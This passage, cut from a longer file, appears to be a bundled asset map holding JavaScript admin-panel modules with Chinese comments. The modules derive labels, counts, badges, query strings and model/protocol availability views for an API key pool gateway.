那道门禁会把注释里的前缀当成一次真实引用、当场报「引用了字典里没有的 key」\n *（本任务实测踩过一次——它不去注释）。由 `tests/ui/keys-write.test.ts` 的\n * 「十二个 code 的 i18n key 逐条以字面量出现在源码里 —— 拼出来的 key 三道门禁都看不见」\n * 那一格按名字锚扫源码钉着（`grep -F` 可验），不是靠行为断言——\n * **拼出来的 key 与写死的 key 在行为上可以逐字节相同。**\n *\n * ⚠️ **默认支刻意是 `upstream_error`**：它是「上游回了个我们没细分的状态码」，\n * 是这一族里最不武断的一句。\n */\nexport function verifyResultLabelKey(code) {\n  if (code === \"ok\") return \"keys.verify.ok\";\n  if (code === \"unauthorized\") return \"keys.verify.unauthorized\";\n  if (code === \"rate_limited\") return \"keys.verify.rateLimited\";\n  if (code === \"timeout\") return \"keys.verify.timeout\";\n  if (code === \"network_error\") return \"keys.verify.networkError\";\n  if (code === \"unknown_reason\") return \"keys.verify.unknownReason\";\n  if (code === \"probe_in_flight\") return \"keys.verify.probeInFlight\";\n  if (code === \"probe_cooldown\") return \"keys.verify.probeCooldown\";\n  if (code === \"key_not_found\") return \"keys.verify.keyNotFound\";\n  if (code === \"unauthorized_admin\") return \"keys.verify.unauthorizedAdmin\";\n  if (code === \"transport_error\") return \"keys.verify.transportError\";\n  return \"keys.verify.upstreamError\";\n}\n", type: "text/javascript; charset=utf-8", etag: "\"153d5be9936569cb\"" },
  "/admin/js/pure/keys.mjs": { body: "/**\n * Key 池板块的**全部取值决策**。板块文件（`js/sec-keys.js`）只剩 DOM 拼装与网络调用。\n *\n * 这不是「顺手拆一下」：admin-ui/README.md 的硬规则 1 就是这么写的\n * （需要测试的逻辑必须放这个目录），而本板块第一版把这些决策留在了板块文件里，\n * 结果 `counts()` 那个「没有数据就当 0」的兜底**直接违反了「绝不伪造 0」**\n * 而没有任何东西能发现——接口一失败，四张汇总卡显示 `0/0/0/0`，\n * 运维看到「可用 0」的第一反应是整池死了。搬到这里之后 `tests/ui/keys.test.ts` 跑得到它。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n */\n\n/**\n * 五个分档。顺序即渲染顺序（汇总卡与筛选下拉共用）。\n *\n * ⚠️ **`disabled` 这一档不是装饰**：后端的 `bucket` 白名单来自 `BUCKETS`，这里漏掉它\n * 的话，运维在筛选下拉里根本选不到「已停用」，而汇总卡也会少一格\n * ——`all` 与另外四格之和对不上，运维看不出那几把 key 去哪了。\n */\nexport const CARDS = [\"all\", \"fresh\", \"cooling\", \"evicted\", \"disabled\"];\n\n/** 自动刷新档位（秒）。**首项是 0 = 关**：面板不替用户决定去轮询。 */\nexport const AUTO_SECONDS = [0, 30, 60];\n\n/**\n * 汇总卡 / 筛选下拉里的条数。\n *\n * **没有数据时逐项返回 `null`，绝不返回 0。** `null` 会被格式化成 `—`。\n * 返回 0 就是伪造一个「我知道，答案是零」的事实——而字典里那句\n * `common.loadFailed` 逐字写着「读取失败，显示为 —」，两边不能各说各的。\n */\nexport function cardCounts(data) {\n  const c = data && typeof data === \"object\" ? data.counts : null;\n  const out = {};\n  for (const k of CARDS) {\n    const v = c && typeof c === \"object\" ? c[k] : null;\n    out[k] = typeof v === \"number\" && Number.isFinite(v) ? v : null;\n  }\n  return out;\n}\n\n/**\n * 分档徽章的样式。**四档必须互不相同**——两档共用一个样式就等于面板分不出它们。\n *\n * `disabled` **不带颜色修饰类**，只有底样式 `badge`（中性灰）：它不是故障，是运维\n * 自己按下的开关，用报警色会让人以为出事了。曾经给它写过一条 `badge-muted`，\n * 而那条 CSS 的取值与 `.badge` 逐字相同 ⇒ 是条死规则（评审 M-a 实测：删掉全绿）。\n * **别为了\"看起来对称\"再造一个同义类**——那只会让「四档互不相同」这句话在字符串\n * 上成立、在屏幕上不成立。\n */\nexport function badgeClass(bucket) {\n  if (bucket === \"disabled\") return \"badge\";\n  if (bucket === \"evicted\") return \"badge badge-danger\";\n  if (bucket === \"cooling\") return \"badge badge-warn\";\n  return \"badge badge-ok\";\n}\n\n/** 分档名的 i18n key。**五条各写一次字面量**，好让 i18n 门禁扫得到。 */\nexport function bucketLabelKey(bucket) {\n  if (bucket === \"fresh\") return \"keys.bucket.fresh\";\n  if (bucket === \"cooling\") return \"keys.bucket.cooling\";\n  if (bucket === \"evicted\") return \"keys.bucket.evicted\";\n  if (bucket === \"disabled\") return \"keys.bucket.disabled\";\n  return \"keys.bucket.all\";\n}\n\nexport function autoLabelKey(sec) {\n  if (sec === 30) return \"keys.auto.30\";\n  if (sec === 60) return \"keys.auto.60\";\n  return \"keys.auto.off\";\n}\n\n/**\n * 列表请求的查询串。\n *\n * `q` 必须转义：搜索框里的 `&` / `=` / `#` 不转义会把后面的参数整个吃掉\n * （`?q=a&bucket=evicted` 会被解析成两个参数），而 `bucket` 是个安全过滤器\n * ——用户敲一个 `&` 就能看到与筛选器显示不符的列表。\n * `all` 档**不发 bucket 参数**：后端把无法识别的值当作不筛，发过去只是噪音。\n */\nexport function keysQuery(state) {\n  const parts = [`page=${state.page}`, `size=${state.size}`];\n  if (state.bucket && state.bucket !== \"all\") parts.push(`bucket=${encodeURIComponent(state.bucket)}`);\n  if (state.q !== undefined && state.q !== null && state.q !== \"\") parts.push(`q=${encodeURIComponent(state.q)}`);\n  return parts.join(\"&\");\n}\n\n/**\n * 冷却剩余毫秒。**只有 cooling 档才有这个值**，其余一律 `null`（渲染成 `—`）。\n *\n * 参照时刻用服务端的 `generatedAt` 而不是浏览器时钟：两者不同源，拿浏览器的 now\n * 去减服务端的 `cooldownUntil`，时钟有偏差时会算出负数或虚高的剩余时间。\n */\nexport function cooldownRemaining(view, now) {\n  if (!view || view.bucket !== \"cooling\") return null;\n  if (typeof view.cooldownUntil !== \"number\" || !Number.isFinite(view.cooldownUntil)) return null;\n  return view.cooldownUntil - now;\n}\n\n/** 最近一次错误。没有就是 `null`——**不返回空串**，空串会被渲染成一个空格子而不是 `—`。 */\nexport function lastErrorParts(view) {\n  const s = view && view.stats ? view.stats : null;\n  if (!s || typeof s.lastErrorKind !== \"string\" || s.lastErrorKind === \"\") return null;\n  return { kind: s.lastErrorKind, at: typeof s.lastErrorAt === \"number\" ? s.lastErrorAt : null };\n}\n\n/**\n * 用量格。`approx` **由后端的 `approximate` 驱动**，不是无条件打 `≈`。\n *\n * 一个没有消费者的响应字段迟早会漂：后端说「这批数字是准的」而面板照样打 `≈`\n * （或反过来）就是两边各说各的。响应里没带这个字段时按**近似**处理——\n * 保守方向是「宁可多打一个 ≈」，不是「悄悄宣称精确」。\n */\nexport function usageParts(view, approximate) {\n  const s = (view && view.stats) || {};\n  return {\n    approx: approximate !== false,\n    requests: typeof s.requests === \"number\" ? s.requests : null,\n    success: typeof s.success === \"number\" ? s.success : null,\n  };\n}\n\n/**\n * 「最后使用」同样是近似值。\n *\n * 它与计数的 staleness **完全相同**（同一次落盘一起带下去），而 `lastUsedAt` 正是\n * 写消除的头号对象：五语言 DEPLOY.md 的 `POOL_TOUCH_INTERVAL_MS` 那一行逐字写着\n * 「面板『最后使用』的精度最粗到这个间隔」（默认 6 小时）。计数打了 `≈` 而它裸着，\n * 就是同一份不确定性只标了一半——运维恰恰靠这一列判断「这把 key 是不是已经不转了」。\n * **从未使用过（null）时不打 `≈`**：那不是「不准」，那是确定的「没用过」。\n */\nexport function lastUsedParts(view, approximate) {\n  const at = view && typeof view.lastUsedAt === \"number\" ? view.lastUsedAt : null;\n  return { at, approx: at !== null && approximate !== false };\n}\n\n/**\n * 「这份响应里有没有可渲染的条目」——**全模块唯一的判据**。\n *\n * 存在的理由：分页复位、列表消息、要不要建表这三处以前各写各的，\n * 其中「`items` 不是数组」一处当空列表、一处放行去建表，一份畸形响应就会走到\n * `for (const v of data.items)` 抛异常。今天后端恒返回数组、走不到，\n * 但三处判据并存本身就是下一次改动的绊子。\n */\nexport function itemsOf(data) {\n  return data && typeof data === \"object\" && Array.isArray(data.items) ? data.items : null;\n}\n\n/**\n * 分页控件的状态。**两条早退分支（读失败 / 空列表）必须一并复位**，\n * 否则读失败之后下面还挂着上一次的「第 1/2 页 · 共 3 条」，那是在展示一份已经不存在的数据。\n */\nexport function pagerState(data) {\n  const items = itemsOf(data);\n  if (items === null || items.length === 0) {\n    return { prevDisabled: true, nextDisabled: true, info: null };\n  }\n  const page = typeof data.page === \"number\" ? data.page : 1;\n  const pages = typeof data.pages === \"number\" ? data.pages : 1;\n  const total = typeof data.total === \"number\" ? data.total : 0;\n  return {\n    prevDisabled: page <= 1,\n    nextDisabled: page >= pages,\n    info: { page, pages, total },\n  };\n}\n\n/**\n * 列表区该显示哪条消息（`null` = 显示表格）。\n *\n * 「池子里还没有 key」与「没有符合条件的 key」必须分开：前者是「去导入」，\n * 后者是「把筛选条件放宽」，指向完全相反的动作。\n */\nexport function listMessageKey(data, loadError) {\n  if (loadError) return \"common.loadFailed\";\n  const items = itemsOf(data);\n  if (items === null || items.length > 0) return null;\n  const c = cardCounts(data);\n  return c.all === 0 ? \"keys.empty\" : \"keys.noMatch\";\n}\n", type: "text/javascript; charset=utf-8", etag: "\"0fcbf7e9df1d6b27\"" },
  "/admin/js/pure/models.mjs": { body: "/**\n * 模型 × 协议可用性矩阵的取值。\n *\n * ⚠️ **判据全部来自 `GET /admin/api/models` 的响应，本模块一个端点路径都不硬编码。**\n * 这是 P3d 核心设计决定（全局约束 15）的落点：四个消费者共用一份真源\n *（`src/core/admin/protocol-catalog.ts`），前端只做呈现。\n * **协议 id、协议展示名、端点的方法与路径，本模块一个都不认识**——它们全部以参数\n * 的形式从那份响应里进来，本文件里连一个协议 id 的字面量都没有。\n *\n * ⚠️ **面板显示的可用性与 `geminiModelList()` 交出去的 `supportedGenerationMethods`\n * 不一致，这是刻意的、不是缺陷**：后者对全部 4 个模型一律声明支持 generateContent，\n * 包括那个视频模型（`src/core/protocol/gemini.ts`）。\n * 那条对外契约的不实登记给 P4，协议目录按**真实可用性**填。理由全文在\n * `src/core/admin/protocol-catalog.ts` 的文件头，**别把这处差异当成目录算错了**。\n *\n * ⚠️ 顺带记一条本文件自己踩过的坑：**上面那一段原来把那条对外端点写成了行内代码\n *（反引号紧挨着路径），而 `tests/ui/no-hardcoded-endpoints.test.ts` 的\n * 「前端没有任何文件硬编码网关端点路径 —— 端点只许来自 /admin/api/models」\n * 扫的正是「引号紧挨着路径」这个形态、且不区分代码与注释 ⇒ 当场变红。\n * 注释里提到端点请写成散文，别加反引号。**\n *\n * ── 本模块不写什么 ──────────────────────────────────────────────────────────\n * · **不写第二份「怎么调这个网关」的知识**：端点、请求体形状、鉴权头，一个都不在这里。\n * · **不写 `fmtDash`**：破折号怎么画是 `admin-ui/js/pure/format.mjs` 的事\n *  （`tests/ui/pure-boundary.test.ts` 的「全部 pure 模块的导出函数名，一个都不许在 sec-*.js 里被重新声明」\n *   那一格扫的是「抄回板块文件」这个方向，改名抄它抓不住——所以这句话得写在这里）。\n * · **不判「这个模型该不该显示」以外的任何业务**：本模块只回答「取哪个值、那个值算哪一档」。\n */\n\n/** 普通对象，否则 `null`。数组不算（`models` 的元素才是对象，`models` 自己是数组）。 */\nfunction obj(v) {\n  return typeof v === \"object\" && v !== null && !Array.isArray(v) ? v : null;\n}\n\n/** 一个数组里每一项都是字符串。 */\nfunction allStrings(v) {\n  return Array.isArray(v) && v.every((x) => typeof x === \"string\");\n}\n\n/**\n * 一个模型在四条协议上各自可不可用。\n *\n * ⚠️⚠️ **四条协议恒返回四项，不可用的那几项 `available: false`，交给调用方画成灰徽章。**\n * **不许把不可用的过滤掉**：四个格子恒在，运维一眼就能看出「这个模型只在一条上可用」；\n * 过滤掉之后图片模型那一行会是空的，**与「读不出来」长得一模一样**——而那是两件事。\n * 由 `tests/ui/models.test.ts` 的\n * 「四个协议徽章恒在，不可用的画灰不隐藏 —— 隐藏之后『只在一条上可用』与『读不出来』长得一样」\n * 那一格钉着（夹具刻意用图片模型：对话模型四条全有，过滤与不过滤**数学上等价**，\n * 拿它做夹具的话这条不变量不可观测）。\n *\n * `protocols` 是 `catalogProtocols()` 交出来的那一份，**顺序即渲染顺序**。\n */\nexport function protocolBadges(model, protocols) {\n  return protocols.map((p) => ({\n    id: p.id,\n    label: p.label,\n    available: Array.isArray(model.protocols) && model.protocols.includes(p.id),\n  }));\n}\n\n/**\n * 按协议筛选（设计 §10.7：工具栏放分段选择器而不是刷新按钮\n * ——agnes 的模型是硬编码的，没有「跨账号刷新」这个动作）。\n *\n * `protocolId` 为空（`\"\"` / `null` / `undefined`）= 「全部」那一档，**原样返回**，\n * 不是「用一个恒真的判据筛一遍」：后者在 `protocols` 读不出来时会静默漏掉整张表。\n */\nexport function filterByProtocol(models, protocolId) {\n  if (!protocolId) return models;\n  return models.filter((m) => Array.isArray(m.protocols) && m.protocols.includes(protocolId));\n}\n\n/**\n * 响应里那份协议清单，窄化成 `[{ id, label }]`。**读不出来时是 `null`，不是空数组。**\n *\n * ⚠️ 「这个网关一条协议都没有」与「这份响应读不出来」是两句话，而一个空数组会让\n * 上面那张矩阵变成**零列**——在屏幕上与「读不出来」长得一样（全局约束 9 的同型）。\n *\n * ⚠️ **任何一条格式不对就整份判成读不出来**，不是把坏的那条跳过：跳过之后面板会\n * 少画一列而**看起来完全正常**，运维得不到任何信号。少画一列的后果是把一条真的\n * 能用的协议入口从文档里抹掉。\n */\nexport function catalogProtocols(payload) {\n  const p = obj(payload);\n  if (p === null || !Array.isArray(p.protocols)) return null;\n  const out = [];\n  for (const item of p.protocols) {\n    const e = obj(item);\n    if (e === null || typeof e.id !== \"string\" || typeof e.label !== \"string\") return null;\n    out.push({ id: e.id, label: e.label });\n  }\n  return out;\n}\n\n/**\n * 响应里那份模型清单，逐条窄化。**读不出来时是 `null`，不是空数组**（同上）。\n *\n * 窄化到**每一条端点**为止：`endpoints` 是板块唯一原样搬运的东西，它里面混进一条\n * 缺字段的记录时，板块渲染出来的是一行 `undefined undefined`——那比整份判成\n * 读不出来更难被发现。\n *\n * ⚠️ **`modality` 只要求是字符串，不在这里限定成三个已知值**：限定成白名单等于\n * 「真源多一个形态 ⇒ 面板整张表读不出来」，那是让一个新增值把面板打死。\n * 表外的值怎么显示由 `modalityLabelKey()` 决定（照实显示原值）。\n */\nexport function catalogModels(payload) {\n  const p = obj(payload);\n  if (p === null || !Array.isArray(p.models)) return null;\n  const out = [];\n  for (const item of p.models) {\n    const m = obj(item);\n    if (m === null || typeof m.id !== \"string\" || typeof m.modality !== \"string\") return null;\n    if (!allStrings(m.protocols)) return null;\n    if (!Array.isArray(m.endpoints)) return null;\n    const endpoints = [];\n    for (const raw of m.endpoints) {\n      const e = obj(raw);\n      if (e === null || typeof e.method !== \"string\" || typeof e.path !== \"string\") return null;\n      endpoints.push({ method: e.method, path: e.path });\n    }\n    out.push({ id: m.id, modality: m.modality, protocols: [...m.protocols], endpoints });\n  }\n  return out;\n}\n\n/**\n * 形态 → 那一列上的文案 key。**列的显示名叫「类型」，字段名一律 `modality`**\n *（评审 Minor 9：别在板块文件里给它另起一个名字）。\n *\n * ⚠️ **一律字面量，禁止把形态名拼进 key**（写成 `t(某个前缀 + modality)` 那种；\n * P3d 全局约束 12）：`scripts/check-i18n.mjs` 的第 ④ 条把动态拼出来的 key 一律\n * 看成「未被引用」，而那一条只报警告、从不 exit 1。\n * ⚠️⚠️ **别把上一句读成「所以第 6 道门禁在守这三个 key 的拼写」**：那道门禁只认\n * 两种形态——把 key 当双引号字面量直接写进 `t(…)` 调用，或写进 HTML 的\n * `data-i18n` 系列属性；本仓主流的 `elI18n(tag, key, attrs)` 它一个都看不见。\n * 真正守着这三个 key 的是 `tests/unit/i18n-dict.test.ts` 的\n * 「板块里当参数传的 i18n key（elI18n / labelKey 这类）同样必须在字典里」那一格，\n * **且前提是 `models` 这个命名空间已经进了它的 `NAMESPACES` 表**（本任务加的）。\n *\n * ⚠️ **这三个字面量是本文件唯一一处「来自真源的词汇表」，它为什么不能也来自响应**：\n * 它们不是端点路径、不是请求体形状、也不是协议名，而是**要翻译的展示名**。\n * 协议的 `label` 之所以能直接从响应里取，是因为它是专名（`\"OpenAI Chat Completions\"`），\n * 翻译它只会制造歧义；「对话 / 图片 / 视频」不是专名，五种语言各不相同，\n * 而协议目录里没有、也不该有一份五语言表。\n * **代价明写**：真源新增一个 modality 时这张表不会自动跟上。所以它 **fail-open**\n * ——表外的值返回 `null`，调用方把原值照实画出来，绝不冒充任何一档已知形态。\n */\nexport function modalityLabelKey(modality) {\n  if (modality === \"chat\") return \"models.modality.chat\";\n  if (modality === \"image\") return \"models.modality.image\";\n  if (modality === \"video\") return \"models.modality.video\";\n  return null;\n}\n", type: "text/javascript; charset=utf-8", etag: "\"b085a74c67a26ae3\"" },
  "/admin/js/pure/overview.mjs": { body: "/**\n * 概览板块的**全部取值决策**。板块文件（`js/sec-overview.js`）只剩 DOM 拼装、\n * 网络调用与 i18n 查表。理由与 `pure/keys.mjs` 同一条（admin-ui/README.md 硬规则 1）：\n * Task 4 的 `cardCounts()` 就是把这类判断留在板块文件里而漏掉「绝不伪造 0」的地方，\n * 这里从第一天就把它们搬过来，好让 `tests/ui/overview.test.ts` 跑得到。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n */\n\n/**\n * 5 张池子卡。顺序即渲染顺序。\n *\n * ⚠️ **第五格（已停用）是 P3c Task 2 加的，它不是可选的装饰**：`poolHealth()` 的四格\n * 互斥且穷尽，少显示一格就意味着 `总数 ≠ 可用 + 冷却中 + 已剔除`，而屏幕上没有任何\n * 东西解释那几把 key 去哪了。设计 §10.1 写的是「+ 有 disabled 时第五格」，\n * 这里**恒显示**：一个真实的 `0` 本来就是真话（读不出来时 `fmtCount(null)` 给 `—`，\n * 「绝不伪造 0」那条仍然由 `poolCounts` 守着），而按条件显隐要多一份判据、\n * 多一条只有它自己会走的渲染分支。\n */\nexport const POOL_CARDS = [\"total\", \"fresh\", \"cooling\", \"evicted\", \"disabled\"];\n\n/** 池子卡的 i18n key。**五条各写一次字面量**，好让 i18n 门禁扫得到（同 keys.mjs 的 bucketLabelKey）。 */\nexport function poolCardLabelKey(card) {\n  if (card === \"fresh\") return \"ov.pool.fresh\";\n  if (card === \"cooling\") return \"ov.pool.cooling\";\n  if (card === \"evicted\") return \"ov.pool.evicted\";\n  if (card === \"disabled\") return \"ov.pool.disabled\";\n  return \"ov.pool.total\";\n}\n\n/** 运行时名字 → i18n key。判据只看响应里 `runtime.name` 这一个字符串字段。 */\nexport function runtimeNameLabelKey(name) {\n  return name === \"worker\" ? \"ov.runtime.worker\" : \"ov.runtime.node\";\n}\n\n/** 存储后端 → i18n key。 */\nexport function storageBackendLabelKey(backend) {\n  return backend === \"kv\" ? \"ov.storage.kv\" : \"ov.storage.file\";\n}\n\n/**\n * 5 张池子卡的取数。**没有数据（`pool` 为 null）时逐项返回 `null`，绝不返回 0。**\n * 判据只看 `body.pool` 存不存在、形状对不对，不看别的块——`overview` 是逐块降级的，\n * 池子块坏了不该连累别的卡。\n *\n * 取数用的是 `POOL_CARDS` 本身，**不再另写一份键名清单**：两份清单曾经并排放着，\n * 加第五格时只改一份就会得到一张永远是 `—` 的卡。\n */\nexport function poolCounts(body) {\n  const p = body && typeof body === \"object\" ? body.pool : null;\n  const out = {};\n  for (const k of POOL_CARDS) {\n    const v = p && typeof p === \"object\" ? p[k] : null;\n    out[k] = typeof v === \"number\" && Number.isFinite(v) ? v : null;\n  }\n  return out;\n}\n\n/**\n * 运行时信息面板里「内存 / 进程存活 / PID」三格该怎么渲染。\n *\n * **判据是 `body.process === null`，不是 `runtime.name === \"worker\"`**——设计文档\n * §13.3 第 6 条与硬约束 1 都点名要求形态分支只读接口返回的实际数据，不许自己嗅探\n * 运行时名字。返回 `{ kind: \"serverless\" }` 时面板显示「Serverless · 无常驻进程」，\n * **不是 0、不是空、不隐藏格子**；返回 `{ kind: \"metrics\", ... }` 时才显示真实数字。\n */\nexport function processCells(body) {\n  const p = body && typeof body === \"object\" ? body.process : undefined;\n  if (p === null) return { kind: \"serverless\" };\n  if (!p || typeof p !== \"object\" || Array.isArray(p)) return { kind: \"unknown\" };\n  const pid = typeof p.pid === \"number\" ? p.pid : null;\n  const rssBytes = typeof p.rssBytes === \"number\" ? p.rssBytes : null;\n  const uptimeMs = typeof p.uptimeMs === \"number\" ? p.uptimeMs : null;\n  return { kind: \"metrics\", pid, rssBytes, uptimeMs };\n}\n\n/**\n * 累计用量卡的五个数。**`poolStats` 为 null 时全部 null**（绝不伪造 0），\n * 成功率交给调用方用 `fmtPercent` 现算——这里只投影原始计数，不重复实现百分比逻辑。\n *\n * **`approx` 由响应的 `approximate` 字段驱动**（产品不变式 10：近似值必须带 `≈`）。\n * 这是 Task 4 评审 I4 的原样复发——那一次的裁定是「一个没有消费者的响应字段迟早会\n * 漂」，第一版的 `usageStats()` 就是又一次没有消费者的字段：写了「由 approximate\n * 驱动」的注释，却没有真的读它，`sec-overview.js` 把 `（≈）` 硬编码进了标题。\n * 响应里没带这个字段（block 缺失）时按**近似**处理——保守方向是宁可多打一个 ≈，\n * 不是悄悄宣称精确，与 `pure/keys.mjs` 的 `usageParts()` 同一条哲学。\n */\nexport function usageStats(body) {\n  const s = body && typeof body === \"object\" ? body.poolStats : null;\n  const numOrNull = (v) => (typeof v === \"number\" && Number.isFinite(v) ? v : null);\n  if (!s || typeof s !== \"object\") {\n    return { requests: null, success: null, failed: null, clientErrors: null, approx: true };\n  }\n  return {\n    requests: numOrNull(s.requests), success: numOrNull(s.success),\n    failed: numOrNull(s.failed), clientErrors: numOrNull(s.clientErrors),\n    approx: s.approximate !== false,\n  };\n}\n\n/**\n * 配置摘要卡。**`config` 整块缺失（存储读失败）时返回 `null` 这一个哨兵**，\n * 不是逐字段各自 null——`primary`/`fallback` 在 `config` 块**存在**时本来就可能是\n * 合法的 `null`（注册机未启用，两条通道平级、没有默认值），把「整块读不出来」\n * 与「读出来了、确实没配」用同一个 `null` 表示，调用方就分不清该显示 `—`\n * 还是显示「无」——这正是本任务实现时抓到的一个真实 bug（评审前自查）。\n */\nexport function configSummary(body) {\n  const c = body && typeof body === \"object\" ? body.config : null;\n  if (!c || typeof c !== \"object\") return null;\n  const envLocked = Array.isArray(c.envLocked) ? c.envLocked.filter((x) => typeof x === \"string\") : [];\n  return {\n    registrarEnabled: typeof c.registrarEnabled === \"boolean\" ? c.registrarEnabled : null,\n    primary: typeof c.primary === \"string\" ? c.primary : null,\n    fallback: typeof c.fallback === \"string\" ? c.fallback : null,\n    targetKeys: typeof c.targetKeys === \"number\" ? c.targetKeys : null,\n    envLocked,\n    degraded: typeof c.degraded === \"boolean\" ? c.degraded : null,\n  };\n}\n\n/**\n * 存储卡。`overview.storage` 不经过逐块降级（它是内存态的 getter，读不出「失败」这回事），\n * 但响应仍可能畸形（接口读失败时整段 body 都拿不到），故一样做防御式取值。\n */\nexport function storageInfo(body) {\n  const s = body && typeof body === \"object\" ? body.storage : null;\n  if (!s || typeof s !== \"object\") return { backend: null, writable: null, checkedAt: null };\n  return {\n    backend: s.backend === \"file\" || s.backend === \"kv\" ? s.backend : null,\n    writable: typeof s.writable === \"boolean\" ? s.writable : null,\n    checkedAt: typeof s.checkedAt === \"number\" ? s.checkedAt : null,\n  };\n}\n\n/**\n * 新鲜度卡的六个数，原样投影（`overview.freshness` 本身不参与逐块降级，\n * 除非整段响应都拿不到）。\n */\nexport function freshnessValues(body) {\n  const f = body && typeof body === \"object\" ? body.freshness : null;\n  const numOrNull = (v) => (typeof v === \"number\" && Number.isFinite(v) ? v : null);\n  if (!f || typeof f !== \"object\") {\n    return {\n      poolCacheTtlMs: null, poolVisibilityUpperBoundMs: null, poolTouchIntervalMs: null,\n      configTtlMs: null, configVisibilityUpperBoundMs: null, kvEdgeCacheMs: null,\n    };\n  }\n  return {\n    poolCacheTtlMs: numOrNull(f.poolCacheTtlMs),\n    poolVisibilityUpperBoundMs: numOrNull(f.poolVisibilityUpperBoundMs),\n    poolTouchIntervalMs: numOrNull(f.poolTouchIntervalMs),\n    configTtlMs: numOrNull(f.configTtlMs),\n    configVisibilityUpperBoundMs: numOrNull(f.configVisibilityUpperBoundMs),\n    kvEdgeCacheMs: numOrNull(f.kvEdgeCacheMs),\n  };\n}\n\n/**\n * `POOL_CACHE_TTL_MS` / `POOL_TOUCH_INTERVAL_MS` / `kvEdgeCacheMs` 三个旋钮的\n * **当前生效值**。\n *\n * **两个板块共用这一个函数**：Key 池板块（`sec-keys.js`）的文案曾经（Task 4）只能\n * 「点名旋钮 + 括注默认值」，因为那时没有任何接口报告这两个旋钮的实际值——它们是\n * 建 app 时读一次、此后不随 `ConfigHolder` 刷新的部署期常量（见 `wire.ts`），\n * 只有 `overview.freshness` 报告了它们。两个板块各自 fetch 一次 `/overview`\n * 拿到同一份数据，用这个函数取出同一组数字，不许各写各的取值逻辑。\n *\n * ⚠️ **`edge` 是 P3b 待办第 4 条的收尾**：`keys.freshness` 那句文案曾经把\n * 「约 60 秒」的 KV 边缘缓存耗时硬编码进五语言字典，与概览页的 `ov.freshness.pool`\n * （早已经由 `kvEdgeCacheMs` 驱动）各说各的——两处一旦有一处改了默认值就会当场\n * 发散，而没有任何东西拦得住。现在两个板块从这同一个函数取同一个数字。\n */\nexport function poolKnobs(body) {\n  const f = freshnessValues(body);\n  return { ttl: f.poolCacheTtlMs, touch: f.poolTouchIntervalMs, edge: f.kvEdgeCacheMs };\n}\n\n/**\n * 本地时区相对 UTC 的偏移（毫秒），供 `pure/format.mjs` 的 `fmtInstant` 当第二个\n * 参数用。**三个板块共用这一个函数**（P3b 待办第 8 条）：概览 / Key 池 / 事件\n * 板块曾经各自手抄同一行 `-new Date().getTimezoneOffset() * 60000`——三份完全\n * 相同的代码互相之间没有任何约束，改掉其中一份、留下另外两份不动，三个板块的\n * 时间戳就会用不同的时区偏移渲染同一份数据，而没有任何自动化会发现。\n *\n * 放在这个模块而不是 `pure/format.mjs`：`fmtInstant` 的契约是「偏移量由调用方\n * 算好传进来」，它本身刻意不读运行环境（见该文件的文件头）；这个函数才是那个\n * 「调用方」，三个板块共用它的道理与上面的 `poolKnobs()` 是同一条——\n * 这个模块已经是三个板块公认的「共用取值」落脚点。\n */\nexport function offsetMs() {\n  return -new Date().getTimezoneOffset() * 60000;\n}\n\n/**\n * Worker 存储卡那一行「本部署的 KV 读写与请求数无关，只取决于刷新频率」的估算。\n *\n * 公式与 `keypool-repo.ts` 的 `KeyPoolRepoOptions.cacheTtlMs` 文档同源（**每个\n * isolate 每天**）：`(86400000 / 池快照TTL) × (1 + 池中key数) + 86400000 / 配置TTL`。\n * **这是单个 isolate 的估算，不是全部署的总量**——总量还要乘以并发的 isolate 数目，\n * 而那个数字面板拿不到，文案必须老实说清楚，不能默认成 1。\n *\n * `poolCacheTtlMs <= 0`（关闭快照缓存，即「每次都真读」）时公式的前提整个不成立\n * ——那种配置下读写次数直接和请求量挂钩，不再是「与请求数无关」，返回 `null`\n * 表示「给不出这个估算」，不是伪造一个基于错误前提的数字。\n */\nexport function kvReadEstimatePerIsolatePerDay(body) {\n  const f = freshnessValues(body);\n  const pool = poolCounts(body);\n  if (f.poolCacheTtlMs === null || f.poolCacheTtlMs <= 0) return null;\n  if (f.configTtlMs === null || f.configTtlMs <= 0) return null;\n  if (pool.total === null) return null;\n  const DAY_MS = 86_400_000;\n  const poolReads = (DAY_MS / f.poolCacheTtlMs) * (1 + pool.total);\n  const configReads = DAY_MS / f.configTtlMs;\n  return Math.round(poolReads + configReads);\n}\n", type: "text/javascript; charset=utf-8", etag: "\"f43e9800fea217f3\"" },
  "/admin/js/pure/playground.mjs": { body: "/**\n * Playground 的**请求构造**：一份协议目录 → 一次请求所需的四样东西\n * （URL、方法、鉴权头的名字、请求体）。\n *\n * ⚠️ **本模块不知道任何端点路径、任何协议 id、任何请求体形状。** 路径模板、请求方法、\n * 鉴权头的名字、流式怎么开、最小请求体，全部来自 `GET /admin/api/models` 的响应\n * （真源 `src/core/admin/protocol-catalog.ts`）。这是设计文档订正 D1 的落点：\n * 集成示例卡与 Playground 是同一份知识，「做两遍必漂，而漂了没人会发现」。\n * **示例卡渲染的那份与这里发出去的这份必须同源。**\n *\n * ── **本模块自己知道的那四小件，逐条登记（别让它们悄悄长大）** ──────────────────\n * ① **`{model}` 这个占位符本身**。`pathTemplate` 交过来的是模板，展开它就必须认识\n *    那个 token；真源里 `endpointFor()` 做的是同一件事，`js/pure/examples.mjs` 也\n *    登记了同一条。**被钉住了**：`tests/ui/playground.test.ts` 的\n *    「真实目录跑出来的四条 URL 里没有一条还留着未展开的模型占位符」——真源哪天换了\n *    占位符写法，那一格当场红。\n * ② **`authorization` 这个头要带 `Bearer ` 前缀**。它是 HTTP 的惯例、不是这个网关的\n *    知识，所以它不在目录里、也不该在目录里；网关那一侧解析它的是\n *    `src/http/middleware/auth.ts` 里那条 bearer 正则。**头的名字仍然来自目录。**\n *    ⚠️ **`js/pure/examples.mjs` 里有同一条判据的第二份**（它的登记项 ②）——\n *    两处一漂，示例卡教出来的调法与 Playground 真发出去的那次就不是同一件事了。\n *    由 `tests/ui/playground.test.ts` 的\n *    「Bearer 前缀这条判据与集成示例卡逐字一致 —— 两处一漂，示例教的就不是面板发的」钉着。\n * ③ ~~**样例请求体里那句占位文本**~~ **——这一件已经不在了（P3d Task 11 消掉的）。**\n *    Task 10 在这里留过一个 `PROMPT_SLOT_SAMPLE = \"ping\"`，登记成「必然的副本」，\n *    理由是「这个目录下禁止 `import`，而它又不在 `GET /admin/api/models` 的响应里」。\n *    